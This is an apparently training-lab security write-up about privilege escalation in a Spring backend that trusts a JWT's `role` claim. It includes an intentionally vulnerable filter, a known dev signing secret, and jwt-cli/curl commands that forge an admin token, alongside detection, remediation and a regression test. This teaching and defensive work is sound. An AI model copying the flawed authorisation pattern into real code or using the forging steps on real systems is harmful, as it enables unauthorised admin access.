# Lab 02 — Privilege escalation by trusting the JWT `role` claim

- **OWASP:** A01 – Broken Access Control / A07 – Identification & Authentication Failures
- **Severity (CVSS-ish):** Critical — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (~9.0). A
  normal customer becomes a full admin: read every order, change order status,
  manage catalog and coupons, run batch jobs.
- **Affected component:** core (`backend`)
- **Control normally enforcing this:** authorities are loaded from the **database**
  in `SecurityConfig#userDetailsService`; the token's `role` claim is never used
  for authorization. Locked by `JwtAuthenticationFilterTest`.

## 1. The weakness

Aurora's JWT carries a `role` claim for convenience (the SPA reads it to toggle
UI). It is **not** meant to be authoritative. On `main`, the auth filter builds
the security principal from the `UserDetails` it loads from the DB:

```java
// main — JwtAuthenticationFilter
UserDetails userDetails = userDetailsService.loadUserByUsername(email);   // DB
...
new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
//                                                          ^ authorities from the DATABASE
```

```java
// main — SecurityConfig#userDetailsService (the source of truth)
.authorities("ROLE_" + user.getRole().name())   // role read from the persisted user
```

The lab commit (`lab/02`) keeps loading the user (so the email must still exist
and the signature/expiry still verify) but derives the granted authority from the
**token's own `role` claim** instead:

```java
// vulnerable-lab — JwtAuthenticationFilter
var authoritiesFromToken = List.of(
        new SimpleGrantedAuthority("ROLE_" + jwtService.extractRole(token)));  // <-- trusts the claim
new UsernamePasswordAuthenticationToken(userDetails, null, authoritiesFromToken);
```

The token is now both the identity **and** the authorization decision — a
client-controlled value deciding privilege. That is the classic JWT
authorization pitfall.

> Diff it: `git diff main -- backend/.../security/jwt/JwtAuthenticationFilter.java`

## 2. Exploit walkthrough

There are two ways in; both work against this branch.

### Variant A — forge an admin token (local lab: the dev secret is known)

The local stack ships a development HMAC secret in
`backend/src/main/resources/application.yml`:

```
aurora-marketplace-development-secret-change-me-before-production-1234567890
```

So an attacker who is a normal customer can mint a perfectly **valid-signature**
token that claims `role: ADMIN`:

```bash
# Register/log in as an ordinary customer first to get a real userId + email.
ATTACKER_EMAIL="attacker@aurora.test"

# Mint a token: same subject/email, but role flipped to ADMIN, signed with the
# known dev secret. (jwt-cli shown; any HS256 signer works.)
SECRET='aurora-marketplace-development-secret-change-me-before-production-1234567890'
FORGED=$(jwt encode \
  --secret "$SECRET" --alg HS256 \
  --sub "$ATTACKER_EMAIL" \
  --payload "role=ADMIN" \
  --payload "userId=<attacker-uuid>" \
  --exp '+60min')

# Hit an admin-only endpoint.
curl -s http://localhost:8088/api/admin/orders \
  -H "Authorization: Bearer $FORGED" | jq
```

**Observed result (vulnerable-lab):** `200 OK` — the full admin order list. On
`main` the same token yields `403 Forbidden`, because the DB says this user is
`ROLE_CUSTOMER` no matter what the claim says.

### Variant B — stale claim survives a demotion (no secret needed)

Even without the secret, trusting the claim is wrong: an admin who is **demoted**
in the DB keeps admin power until their existing token expires, because the
running token still says `role: ADMIN`. On `main` the demotion takes effect on
the very next request (authorities are re-read from the DB each time). This
variant is the cleaner demonstration that *the token must never be the source of
authorization truth.*

> The deeper lesson holds **even if the secret were strong**: binding privilege
> to a self-asserted token claim means you can no longer revoke or change a
> user's role server-side within the token's lifetime.

## 3. Impact

- **Asset hit:** the entire admin surface — orders, catalog, coupons, audit log,
  Spring Batch jobs (`/api/admin/**`).
- **Blast radius:** complete authorization bypass from any low-privilege account.
  This is the highest-severity scenario in the lab.

## 4. Detection

- **Mismatch signal:** a request authorized as `ROLE_ADMIN` whose subject resolves
  to a DB user with `role = CUSTOMER` is impossible under the correct control and
  trivially alarmable if you log both.
- **Admin-endpoint access by non-admin principals** should be a high-priority
  audit/metric. Aurora logs 401/403 denials (`SecurityConfig#writeErrorResponse`);
  under the fixed control the forged token simply produces those `403`s.
- A spike in newly-minted tokens with `role: ADMIN` for accounts that never logged
  in as admin is a forging signal.

## 5. Remediation (already on `main`)

The fix is structural, not a patch: **never read authorization from the token.**
`SecurityConfig#userDetailsService` reloads the user from the database every
request and derives authorities from the persisted `role`; the filter passes
`userDetails.getAuthorities()` to the principal. `JwtService.verifyWith(key)`
additionally pins the algorithm and rejects tampered/unsigned tokens (so the
`alg=none` variant — Lab 05 — also fails). The `role` claim remains in the token
purely as a UI hint with **zero** security weight.

Re-running Variant A against `main`:

```
HTTP/1.1 403 Forbidden
{"code":"FORBIDDEN","message":"Access is denied.", ...}
```

Restore with `git checkout main -- backend/.../security/jwt/JwtAuthenticationFilter.java backend/.../security/jwt/JwtService.java`.

## 6. Regression test

**This control IS locked by a shipped test** —
`JwtAuthenticationFilterTest.withAValidTokenItAuthenticatesUsingDatabaseAuthorities`
asserts the authenticated principal's authority comes from the loaded
`UserDetails`, **not** the token:

```java
UserDetails details = dbUser("ada@aurora.test", "ROLE_ADMIN");
when(userDetailsService.loadUserByUsername("ada@aurora.test")).thenReturn(details);
...
assertThat(auth.getAuthorities()).extracting(Object::toString).containsExactly("ROLE_ADMIN");
// authority comes from the DB user, regardless of any token claim
```

Proof the test does its job: this lab's weakening **breaks that test** — run it on
this branch and it fails, because the filter now grants `ROLE_` + the claim
rather than the DB authority:

```powershell
cd backend
.\mvnw.cmd test "-Dtest=JwtAuthenticationFilterTest"   # RED on vulnerable-lab, GREEN on main
```

That red-on-break / green-on-fix behavior is exactly why the regression test
exists: the escalation cannot silently return to `main`.
